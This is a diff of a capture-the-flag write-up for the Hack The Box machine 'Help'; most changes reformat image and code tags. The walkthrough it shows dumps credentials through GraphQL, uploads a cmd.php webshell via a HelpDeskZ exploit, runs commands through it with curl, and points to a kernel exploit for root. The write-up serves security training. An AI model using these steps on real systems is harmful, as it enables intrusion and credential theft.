@@ -55,21 +55,21 @@ GraphQL was present. So we need to send `query` parameters and hopefully find so
 
 At the top, we see this:
 
-<figure><img src="../../../.gitbook/assets/image (2000).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2000).png>)
 
 This means we can query `username` and `password` fields from `user`, which would make `{user{username,password}}`.
 
-<figure><img src="../../../.gitbook/assets/image (2212).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2212).png>)
 
 The hash is crackable on CrackStation.
 
-<figure><img src="../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(206).png>)
 
 ### HelpDeskZ
 
 On port 80, it just shows the default Apache2 page:
 
-<figure><img src="../../../.gitbook/assets/image (2383).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2383).png>)
 
 Doing a `gobuster` scan reveals some directories:
 
@@ -98,11 +98,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 `/support` reveals a HelpDeskZ instance:
 
-<figure><img src="../../../.gitbook/assets/image (2297).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2297).png>)
 
 We can login with `helpme@helpme.com:godhelpmeplz`. From the HelpDeskZ repository, there's a `readme.html` file present where we can find the version that is running.
 
-<figure><img src="../../../.gitbook/assets/image (2709).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2709).png>)
 
 This version has an exploit available:
 
@@ -118,11 +118,10 @@ HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauth | php/webapps/41200.p
 
 First we need to open a ticket and then upload a `cmd.php` webshell.
 
-<figure><img src="../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(306).png>)
 
 Then we can submit this, and even though the website says the file type is not allowed, **the file is still uploaded onto the website**. Then, we can use `40200.py` to find it.
 
-{% code overflow="wrap" %}
 ```
 $ python2 40300.py http://help.htb/support/uploads/tickets/ cmd.php  2> /dev/null
 Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
@@ -131,11 +130,10 @@ http://help.htb/support/uploads/tickets/39a4def6c8a341531c5668661046e30d.php
 $ curl http://help.htb/support/uploads/tickets/39a4def6c8a341531c5668661046e30d.php?cmd=id
 uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
 ```
-{% endcode %}
 
 Then, we can get a reverse shell easily and capture the user flag.
 
-<figure><img src="../../../.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(984).png>)
 
 ## Privilege Escalation
 
@@ -143,15 +141,13 @@ Then, we can get a reverse shell easily and capture the user flag.
 
 The machine is running an outdated version of Linux:
 
-{% code overflow="wrap" %}
 ```
 help@help:/home/help$ uname -a
 Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 ```
-{% endcode %}
 
 We can use this kernel exploit to get a root shell:
 
 {% embed url="https://www.exploit-db.com/exploits/44298" %}
 
-<figure><img src="../../../.gitbook/assets/image (1937).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1937).png>)
